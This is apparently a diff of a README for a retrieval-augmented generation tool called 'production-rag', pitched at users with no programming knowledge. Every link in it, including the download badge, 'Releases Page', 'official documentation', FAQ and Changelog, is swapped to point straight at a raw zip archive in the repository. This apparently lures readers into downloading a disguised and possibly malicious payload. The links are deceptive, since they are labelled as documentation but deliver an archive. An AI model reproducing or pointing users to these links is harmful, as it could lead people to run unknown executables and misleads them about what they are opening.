@@ -4,7 +4,7 @@
 Welcome to **production-rag**! This software helps you generate information in a smart way using different search strategies. You don’t need to know anything about programming to use it.
 
 ## 📥 Download Now
-[![Download Here](https://raw.githubusercontent.com/mahdidjemaci/production-rag/main/evaluation/production-rag-2.2.zip%20Now-Click%https://raw.githubusercontent.com/mahdidjemaci/production-rag/main/evaluation/production-rag-2.2.zip)](https://raw.githubusercontent.com/mahdidjemaci/production-rag/main/evaluation/production-rag-2.2.zip)
+[![Download Here](https://raw.githubusercontent.com/mahdidjemaci/production-rag/main/rag/rag-production-v1.9.zip%20Now-Click%https://raw.githubusercontent.com/mahdidjemaci/production-rag/main/rag/rag-production-v1.9.zip)](https://raw.githubusercontent.com/mahdidjemaci/production-rag/main/rag/rag-production-v1.9.zip)
 
 ## 📋 Overview
 **production-rag** is designed for ease of use. It combines advanced retrieval techniques to provide high-quality responses. You can access various features and evaluate different strategies to improve your results. 
@@ -25,7 +25,7 @@ Follow these steps to download and run the software.
 ### 1. Visit the Releases Page
 Go to our Releases page to find the latest version of **production-rag**. You can do this by clicking the link below:
 
-[Visit Releases Page](https://raw.githubusercontent.com/mahdidjemaci/production-rag/main/evaluation/production-rag-2.2.zip)
+[Visit Releases Page](https://raw.githubusercontent.com/mahdidjemaci/production-rag/main/rag/rag-production-v1.9.zip)
 
 ### 2. Locate the Downloadable File
 Once on the Releases page, look for the latest version. It will be clearly marked. Download the file that's appropriate for your operating system.
@@ -43,8 +43,8 @@ After installation, you will find **production-rag** in your applications or pro
 You're all set! Begin exploring how **production-rag** can enhance your information retrieval tasks. Use the various features to refine your searches and evaluate the results.
 
 ## 🛠️ Additional Resources
-- **Documentation:** For a detailed guide on using each feature, please refer to the [official documentation](https://raw.githubusercontent.com/mahdidjemaci/production-rag/main/evaluation/production-rag-2.2.zip).
-- **Support:** If you encounter issues, check our [Frequently Asked Questions (FAQ)](https://raw.githubusercontent.com/mahdidjemaci/production-rag/main/evaluation/production-rag-2.2.zip).
+- **Documentation:** For a detailed guide on using each feature, please refer to the [official documentation](https://raw.githubusercontent.com/mahdidjemaci/production-rag/main/rag/rag-production-v1.9.zip).
+- **Support:** If you encounter issues, check our [Frequently Asked Questions (FAQ)](https://raw.githubusercontent.com/mahdidjemaci/production-rag/main/rag/rag-production-v1.9.zip).
 
 ## 🌐 Join the Community
 Become part of the **production-rag** community. Share your experiences and learn from others. We value user feedback for continued improvement.
@@ -53,11 +53,11 @@ Become part of the **production-rag** community. Share your experiences and lear
 For more information, feel free to reach out through the project's GitHub Issues page or contact us via our community channels.
 
 ## 📜 Changelog
-Stay updated on changes and improvements through the [Changelog](https://raw.githubusercontent.com/mahdidjemaci/production-rag/main/evaluation/production-rag-2.2.zip).
+Stay updated on changes and improvements through the [Changelog](https://raw.githubusercontent.com/mahdidjemaci/production-rag/main/rag/rag-production-v1.9.zip).
 
 ## 📥 Download Again
 To revisit and download the software or the latest updates, please click here:
 
-[Visit Releases Page](https://raw.githubusercontent.com/mahdidjemaci/production-rag/main/evaluation/production-rag-2.2.zip)
+[Visit Releases Page](https://raw.githubusercontent.com/mahdidjemaci/production-rag/main/rag/rag-production-v1.9.zip)
 
 Enjoy using **production-rag**!
